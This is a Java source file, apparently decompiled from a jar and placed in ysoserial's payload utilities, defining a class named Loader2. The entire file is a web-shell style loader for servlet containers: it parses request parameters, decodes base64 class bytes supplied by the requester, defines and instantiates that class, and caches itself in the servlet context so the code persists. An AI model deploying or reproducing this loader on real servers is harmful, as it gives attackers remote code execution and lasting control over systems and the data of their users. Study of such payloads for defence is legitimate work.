package ysoserial.payloads.util;

import java.net.URLDecoder;
import java.util.HashMap;
import java.util.Map;
import javax.servlet.ServletContext;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletRequestWrapper;
import javax.servlet.jsp.PageContext;
import javax.xml.bind.DatatypeConverter;
import org.mozilla.classfile.DefiningClassLoader;

/* loaded from: jar1.jar:myjar/Loader2.class */
public class Loader2 extends HttpServletRequestWrapper {
    public static Map m = new HashMap();
    Map<String, String> mP;

    public Loader2(HttpServletRequest httpServletRequest) {
        super(httpServletRequest);
        this.mP = new HashMap();
        sx(httpServletRequest);
    }

    public String getParameter(String str) {
        return this.mP.get(str);
    }

    public Loader2() {
        this(null);
    }

    public Class g(String str, byte[] bArr) {
        Class cls = (Class) m.get(str);
        if (cls == null) {
            cls = new DefiningClassLoader().defineClass(str, bArr);
            m.put(str, cls);
        }
        return cls;
    }

    private String getS(String str) {
        try {
            str = URLDecoder.decode(URLDecoder.decode(str, "utf-8"), "utf-8");
        } catch (Exception e) {
        }
        return str;
    }

    private void getX(String str) {
        String[] split = str.split("&");
        for (int i = 0; i < split.length; i++) {
            if (2 < split[i].length()) {
                String[] split2 = split[i].split("=");
                if (2 == split2.length) {
                    String trim = split2[1].trim();
                    split2[1] = trim;
                    if (trim.length() > 0) {
                        this.mP.put(getS(split2[0]), getS(split2[1]));
                    }
                }
            }
        }
    }

    public void sx(HttpServletRequest httpServletRequest) {
        int contentLength = httpServletRequest.getContentLength();
        if (contentLength > 0) {
            byte[] bArr = new byte[contentLength];
            try {
                httpServletRequest.getInputStream().read(bArr, 0, contentLength);
                getX(new String(bArr, "utf-8"));
            } catch (Exception e) {
            }
        }
        String queryString = httpServletRequest.getQueryString();
        if (queryString != null) {
            getX(queryString);
        }
    }

    public boolean equals(Object obj) {
        if (obj instanceof PageContext) {
            try {
                PageContext pageContext = (PageContext) obj;
                sx((HttpServletRequest) pageContext.getRequest());
                ServletContext servletContext = pageContext.getServletContext();
                String str = this.mP.get("_c");
                String str2 = this.mP.get("_cn");
                Loader2 attribute = servletContext.getAttribute("_x3_ld_");
                if (attribute == null) {
                    Loader2 loader2 = new Loader2();
                    attribute = loader2;
                    servletContext.setAttribute("_x3_ld_", loader2);
                }
                if (str == null || str2 == null) {
                    return true;
                }
                ((Class) attribute.getClass().getMethod("g", String.class, byte[].class).invoke(attribute, str2, DatatypeConverter.parseBase64Binary(str))).newInstance().equals(obj);
                return true;
            } catch (Exception e) {
                return true;
            }
        }
        return true;
    }
}
